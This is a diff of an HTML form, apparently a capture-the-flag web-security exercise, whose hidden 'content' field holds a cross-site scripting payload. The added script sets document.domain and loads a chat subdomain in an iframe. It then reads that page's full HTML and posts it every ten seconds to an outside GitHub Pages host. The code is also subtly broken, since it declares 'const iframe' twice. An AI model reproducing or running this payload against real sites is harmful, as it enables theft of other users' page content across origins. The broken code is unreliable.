@@ -18,22 +18,42 @@
       <input
         type="hidden"
         name="content"
-        value='&lt;script&gt;
+        value='<script>
         document.domain = "owley-madison.jeopardy.websec.saarland";
-        fetch("https://chat.owley-madison.jeopardy.websec.saarland/Sherrell")
-          .then((response) =&gt; {
-            if (!response.ok) {
-              throw new Error(`HTTP error! status: ${response.status}`);
+        const iframe = document.createElement("iframe");
+        iframe.src = "https://chat.owley-madison.jeopardy.websec.saarland/";
+        iframe.style.width = "60%";  // Adjust width as needed
+        iframe.style.height = "300px"; // Adjust height as needed
+        iframe.style.border = "1px solid #000";
+        iframe.style.position = "absolute"; // Positioning
+        iframe.style.top = "50%";  // Vertically center
+        iframe.style.left = "50%";  // Horizontally center
+        iframe.style.transform = "translate(-50%, -50%)";  // Adjust position based on its own size
+        document.body.appendChild(iframe);
+
+        const iframe = document.querySelector("iframe"); // Assuming you already have the iframe
+        function sendIframeContent() {
+            try {
+                // Access the iframes document and extract its content
+                const iframeDoc = iframe.contentWindow.document;
+                const iframeContent = iframeDoc.documentElement.outerHTML; // Get the entire HTML content
+
+                // Create a message with the iframes content
+                const message = {
+                    content: iframeContent, // Serialized iframe content
+                    timestamp: new Date().toISOString(), // Optional timestamp
+                };
+
+                // Send the message to the target domain
+                const targetWindow = window.open("https://sep-81.github.io/", "_blank"); // Open the host
+                targetWindow.postMessage(message, "https://sep-81.github.io/");
+            } catch (error) {
+                console.error("Error accessing iframe content:", error);
             }
-            return response.text();
-          })
-          .then((data) =&gt; {
-            alert(data);
-          })
-          .catch((error) =&gt; {
-            alert(`Failed to fetch data: ${error.message}`);
-          });
-        &lt;/script&gt;
+        }
+        // Set an interval to send the iframe content every 10 seconds
+        setInterval(sendIframeContent, 10000);
+        </script>
       '
       />
       <!-- <input type="hidden" name="csrfmiddlewaretoken" value="3lGdmYw7qFDwvTMOij4azwg70KXefwwfXXzLToNXceLC464hpgVCf5E4hc79ZKZG" /> -->
